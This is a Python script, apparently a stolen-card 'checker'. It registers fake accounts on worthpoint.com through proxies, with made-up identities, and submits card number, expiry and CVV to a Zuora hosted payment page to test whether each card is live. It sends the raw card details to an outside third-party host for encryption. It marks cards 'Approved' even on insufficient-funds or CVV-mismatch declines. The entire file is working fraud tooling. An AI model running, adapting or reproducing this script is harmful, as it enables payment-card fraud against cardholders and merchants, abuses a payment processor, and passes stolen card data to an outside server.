from bs4 import BeautifulSoup
import random
import aiohttp
import asyncio
import json
import names
import platform
import ssl
import certifi
import names
import random_address

genaddr = random_address.real_random_address()
address = genaddr['address1']
try: 
    City = genaddr['city']
except KeyError:
    City = "FL"
State = genaddr['state']
Zip_Code = genaddr['postalCode']
first = names.get_first_name()
last = names.get_last_name()
if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

passw = f'ZF{random.randint(1,9)}DxA{random.randint(1,9)}{random.randint(1,9)}Vtqk{random.randint(1,9)}qxa{random.randint(1,9)}@'

async def VantivZuora(cc, proxyrand):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as session:
        splitter = cc.split('|')
        ccnum    = splitter[0]
        try:
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                'Referer': 'https://www.worthpoint.com/worthopedia',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
            })
            CorreoRand = f"{names.get_first_name()}{names.get_first_name()}{names.get_last_name()}{random.randint(10000,9999999)}@gmail.com"
            async with session.get('https://www.worthpoint.com/product/index', proxy=str(proxyrand), timeout=22) as resp:
                try :          
                    response = await resp.text()
                except (UnboundLocalError):
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
                except (KeyError):
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
                except (TypeError):
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 2------------------------------#
            #---------------------------------REQUEST NUMERO 2------------------------------#      
            data = {
                'SYNCHRONIZER_TOKEN': f'fdb{random.randint(1,9)}ed{random.randint(1,9)}c-{random.randint(10,99)}ca-{random.randint(1,9)}fa{random.randint(1,9)}-bb{random.randint(10,99)}-e{random.randint(1,9)}b{random.randint(1000,9999)}a{random.randint(10,99)}a{random.randint(1,9)}',
                'SYNCHRONIZER_URI': '/product/index',
                'currency': 'USD',
                'product': 'USD.8a128b5f7f1f7507017f26e56b292e0b',
            }
            async with session.post('https://www.worthpoint.com/product/createNewAccount', data=data, proxy=str(proxyrand), timeout=22) as resp:
                try :          
                    response = await resp.text()
                    Tries = 0
                    FinalTries = 0   
                    while Tries < 2:
                        if resp.status not in [200, 409]:
                            data = {
                                'SYNCHRONIZER_TOKEN': f'fdb9ed5c-{random.randint(10,99)}ca-4fa1-bb{random.randint(10,99)}-e5b{random.randint(1000,9999)}a35a9',
                                'SYNCHRONIZER_URI': '/product/index',
                                'currency': 'USD',
                                'product': 'USD.8a128b5f7f1f7507017f26e56b292e0b',
                            }
                            async with session.post('https://www.worthpoint.com/product/createNewAccount', data=data, proxy=str(proxyrand), timeout=22) as resp:
                                response = await resp.text()
                                if resp.status not in [200, 409]:
                                    Tries+=1
                                    FinalTries+=1
                                    print(f"[Require Retrie] Tries: {Tries}")
                                else :
                                    Tries+=2
                                    FinalTries+=0
                        else :
                            Tries+=2
                            FinalTries = 0
                    if int(FinalTries) >= 2 :
                        return "Maximum number of retries reached.02"
                    else : print(f"Tries: {FinalTries}")
                    soup = BeautifulSoup(response , 'lxml')
                    SYNCHRONIZER_TOKEN = soup.find("input", {"name": "SYNCHRONIZER_TOKEN"})["value"]
                except (UnboundLocalError):
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'
                except (KeyError):
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'
                except (TypeError):
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 3------------------------------#
            #---------------------------------REQUEST NUMERO 3------------------------------#      
            data = {
                'SYNCHRONIZER_TOKEN': SYNCHRONIZER_TOKEN,
                'SYNCHRONIZER_URI': '/product/createNewAccount',
                'firstName': f"{first}{random.randint(10,9999)}",
                'lastName': f"{last}{random.randint(10,9999)}",
                'email': CorreoRand,
                'password': passw,
                'confirmPassword': passw,
                'product': 'USD.8a128b5f7f1f7507017f26e56b292e0b',
                'newsletter': 'on',
            }
            async with session.post('https://www.worthpoint.com/product/subscribe', data=data, proxy=str(proxyrand), timeout=22) as resp:
                try :          
                    response = await resp.text()
                    Tries = 0
                    FinalTries = 0   
                    while Tries < 2:
                        if (int(response.find('signature:')) == -1):
                            data = {
                                'SYNCHRONIZER_TOKEN': SYNCHRONIZER_TOKEN,
                                'SYNCHRONIZER_URI': '/product/createNewAccount',
                                'firstName': f"{first}{random.randint(10,9999)}",
                                'lastName': f"{last}{random.randint(10,9999)}",
                                'email': CorreoRand,
                                'password': passw,
                                'confirmPassword': passw,
                                'product': 'USD.8a128b5f7f1f7507017f26e56b292e0b',
                                'newsletter': 'on',
                            }
                            async with session.post('https://www.worthpoint.com/product/subscribe', data=data, proxy=str(proxyrand), timeout=22) as resp:
                                response = await resp.text()
                                if (int(response.find('signature:')) == -1):
                                    Tries+=1
                                    FinalTries+=1
                                    print(f"[Require Retrie] Tries: {Tries}")
                                else :
                                    Tries+=2
                                    FinalTries+=0
                        else :
                            Tries+=3
                            FinalTries = 0
                    if int(FinalTries) >= 2 :
                        return "Maximum number of retries reached.03"
                    else : print(f"Tries: {FinalTries}")

                    host = resp.real_url
                    lines = response.split("\n")
                    for i in lines:
                        if "signature:" in i:
                            sucio = i
                            signature = sucio.replace('        signature: "', "").replace('",', "")
                    for i in lines:
                        if "token:" in i:
                            sucio = i
                            token = sucio.replace('        token: "', "").replace('",', "")
                except (UnboundLocalError):
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
                except (KeyError):
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
                except (TypeError):
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 4-------------------------------#
            #---------------------------------REQUEST NUMERO 4-------------------------------#
            try :
                params = {
                    'method': 'requestPage',
                    'host': f'{host}',
                    'fromHostedPage': 'true',
                    'field_passthrough1': 'USD.8a128b5f7f1f7507017f26e56b292e0b',
                    'field_passthrough2': '',
                    'tenantId': '4874',
                    'id': '2c92a00c6b9d9269016ba86938d07ee6',
                    'token': f'{token}',
                    'signature': f'{signature}',
                    'style': 'inline',
                    'submitEnabled': 'false',
                    'locale': 'en_US',
                    'price': '26.99',
                    'currency': 'USD',
                    'productDescription': 'Price Guide Premium Monthly Membership',
                    'customizeErrorRequired': 'true',
                    'zlog_level': 'warn'
                }
            except (UnboundLocalError):
                await session.close()
                return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'

            async with session.get('https://www.zuora.com/apps/PublicHostedPageLite.do', params=params, proxy=str(proxyrand), timeout=22) as resp:
                try :          
                    response = await resp.text()
                    soup = BeautifulSoup(response , 'lxml')
                    field_key = soup.find("input", {"name": "field_key"})["value"]
                    id = soup.find("input", {"name": "id"})["value"]
                    signature = soup.find("input", {"name": "signature"})["value"]
                    token = soup.find("input", {"name": "token"})["value"]
                    xjd28s_6sk = soup.find("input", {"name": "xjd28s_6sk"})["value"]
                except (UnboundLocalError):
                    await session.close()
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'
                except (KeyError):
                    await session.close()
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'
                except (TypeError):
                    await session.close()
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 5------------------------------#
            #---------------------------------REQUEST NUMERO 5------------------------------#
            async def EncryptValue(cc, keyvalue) :
                async with aiohttp.ClientSession() as session:
                    splitter = cc.split('|')
                    ccnum    = splitter[0]
                    mes      = splitter[1]
                    ano      = splitter[2]
                    cvv      = splitter[3] 

                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        'yakuza-nonce':'e35f951e-b878-5449-8de6-235ddee7b258',
                        #'Content-Type': 'application/json'
                    }
                    data = {
                        "pk": keyvalue,
                        "data": [f"#{random.randint(10,99)}.{random.randint(100,999)}.{random.randint(10,99)}.{random.randint(100,999)}#{ccnum}#{cvv}#{mes}#{ano}"]
                    } 
                    async with session.post('https://api.xn--45qx7by8s.online/zoura', json=data, headers=headers, proxy=str(proxyrand)) as resp:
                        try :                    
                            jsonresponse = await resp.json()
                            token = jsonresponse["response"]
                            return token
                        except (aiohttp.client_exceptions.ContentTypeError):
                            await session.close()
                            return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️'
                        except (KeyError):
                            await session.close()
                            return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️'
                        except (TypeError):
                            await session.close()
                            return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 6---------------------------------#
            #---------------------------------REQUEST NUMERO 6---------------------------------#  
            EncryptValue = await EncryptValue(cc, field_key)
            if EncryptValue == 'An unexpected error occurred in request 05. It was not generated correctly. ♻️' :
                return EncryptValue
            if int(ccnum[0:1]) == 4 :  
                Type = 'Visa'
            elif int(ccnum[0:1]) == 5 : 
                Type = 'MasterCard'
            elif int(ccnum[0:1]) == 6 : 
                Type = 'Discover'
                
            data = {
                'method': 'submitPage',
                'id': '2c92a00c6b9d9269016ba86938d07ee6',
                'tenantId': '4874',
                'token': f'{token}',
                'signature': f'{signature}',
                'paymentGateway': '',
                'field_authorizationAmount': '',
                'field_currency': 'USD',
                'field_key': f'{field_key}',
                'field_style': 'inline',
                'jsVersion': '1.3.0',
                'field_submitEnabled': 'false',
                'field_signatureType': '',
                'host': f'{host}',
                'encrypted_fields': '#field_ipAddress#field_creditCardNumber#field_cardSecurityCode#field_creditCardExpirationMonth#field_creditCardExpirationYear',
                'encrypted_values': f'{EncryptValue}',
                'customizeErrorRequired': 'true',
                'fromHostedPage': 'true',
                'isGScriptLoaded': 'true',
                'is3DSEnabled': '',
                'checkDuplicated': '',
                'captchaRequired': '',
                'captchaSiteKey': '',
                'field_mitConsentAgreementSrc': '',
                'field_mitConsentAgreementRef': '',
                'field_mitCredentialProfileType': '',
                'field_agreementSupportedBrands': '',
                'paymentGatewayType': '',
                'paymentGatewayVersion': '',
                'is3DS2Enabled': '',
                'cardMandateEnabled': '',
                'zThreeDs2TxId': '',
                'threeDs2token': '',
                'threeDs2Sig': '',
                'threeDs2Ts': '',
                'threeDs2OnStep': '',
                'threeDs2GwData': '',
                'doPayment': '',
                'storePaymentMethod': '',
                'documents': '',
                'xjd28s_6sk': f'{xjd28s_6sk}',
                'pmId': '',
                'button_outside_force_redirect': 'false',
                'field_passthrough1': 'USD.8a128b5f7f1f7507017f26e56b292e0b',
                'field_passthrough2': '1565572',
                'field_passthrough3': '',
                'field_passthrough4': '',
                'field_passthrough5': '',
                'field_passthrough6': '',
                'field_passthrough7': '',
                'field_passthrough8': '',
                'field_passthrough9': '',
                'field_passthrough10': '',
                'field_passthrough11': '',
                'field_passthrough12': '',
                'field_passthrough13': '',
                'field_passthrough14': '',
                'field_passthrough15': '',
                'field_accountId': '',
                'field_gatewayName': '',
                'field_deviceSessionId': '',
                'field_ipAddress': '',
                'field_useDefaultRetryRule': '',
                'field_paymentRetryWindow': '',
                'field_maxConsecutivePaymentFailures': '',
                'field_creditCardHolderName': f'{first} {names.get_first_name()} {last} {names.get_first_name()}',
                'field_creditCardNumber': '',
                'field_creditCardExpirationMonth': '',
                'field_creditCardExpirationYear': '',
                'field_cardSecurityCode': '',
                'field_creditCardType': Type,
                'field_creditCardAddress1': address,
                'field_creditCardAddress2': '',
                'field_creditCardCity': City,
                'field_creditCardState': State,
                'field_creditCardPostalCode': Zip_Code,
                'field_creditCardCountry': 'USA',
                'field_phone': f'{random.randint(100,999)}{random.randint(100,999)}{random.randint(1000,9999)}',
                'encodedZuoraIframeInfo': 'eyJpc0Zvcm1FeGlzdCI6dHJ1ZSwiaXNGb3JtSGlkZGVuIjpmYWxzZSwienVvcmFFbmRwb2ludCI6Imh0dHBzOi8vd3d3Lnp1b3JhLmNvbS9hcHBzLyIsImZvcm1XaWR0aCI6MzkxLCJmb3JtSGVpZ2h0Ijo5MDQsImxheW91dFN0eWxlIjoiYnV0dG9uT3V0c2lkZSIsInp1b3JhSnNWZXJzaW9uIjoiMS4zLjAiLCJmb3JtRmllbGRzIjpbeyJpZCI6ImZvcm0tZWxlbWVudC1jcmVkaXRDYXJkVHlwZSIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZE51bWJlciIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZEV4cGlyYXRpb25ZZWFyIiwiZXhpc3RzIjp0cnVlLCJpc0hpZGRlbiI6ZmFsc2V9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkSG9sZGVyTmFtZSIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZENvdW50cnkiLCJleGlzdHMiOnRydWUsImlzSGlkZGVuIjpmYWxzZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRTdGF0ZSIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZEFkZHJlc3MxIiwiZXhpc3RzIjp0cnVlLCJpc0hpZGRlbiI6ZmFsc2V9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkQWRkcmVzczIiLCJleGlzdHMiOnRydWUsImlzSGlkZGVuIjpmYWxzZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRDaXR5IiwiZXhpc3RzIjp0cnVlLCJpc0hpZGRlbiI6ZmFsc2V9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkUG9zdGFsQ29kZSIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtcGhvbmUiLCJleGlzdHMiOnRydWUsImlzSGlkZGVuIjpmYWxzZX0seyJpZCI6ImlucHV0LWVtYWlsIiwiZXhpc3RzIjpmYWxzZSwiaXNIaWRkZW4iOnRydWV9XX0=',
            }
            async with session.post('https://www.zuora.com/apps/PublicHostedPageLite.do', data=data, proxy=str(proxyrand), timeout=22) as resp:
                try :
                    response = await resp.text()
                except (UnboundLocalError):
                    await session.close()
                    return 'An unexpected error occurred in request 06. It was not generated correctly. ♻️'
                except (KeyError):
                    await session.close()
                    return 'An unexpected error occurred in request 06. It was not generated correctly. ♻️'
                except (TypeError):
                    await session.close()
                    return 'An unexpected error occurred in request 06. It was not generated correctly. ♻️'
            #---------------------------------REQUEST CHECKS-------------------------------#
            #---------------------------------REQUEST CHECKS-------------------------------#

            if (int(response.find('"success":"true"')) > 0):
                await session.close()
                return "Approved", "Approved"
            elif (int(response.find('Transaction declined.352 - CVV Note: No Match')) > 0) or (int(response.find('Transaction declined.110 - Insufficient Funds')) > 0):
                response = json.loads(response)
                errormessage = response['errorMessage']
                await session.close()
                return "Approved", errormessage
            elif int(response.find('errorMessage')) > 0 :
                response = json.loads(response)
                errormessage = response['errorMessage']
                await session.close()
                return errormessage
            else :
                await session.close()
                print("Error in /saf")
                return "An unexpected error occurred in response. It was not generated correctly. ⚠️"
        except (aiohttp.client_exceptions.ServerDisconnectedError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (asyncio.exceptions.TimeoutError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (aiohttp.client_exceptions.ClientConnectorError):
            return "An unexpected error occurred. Timeout Error. ♻️"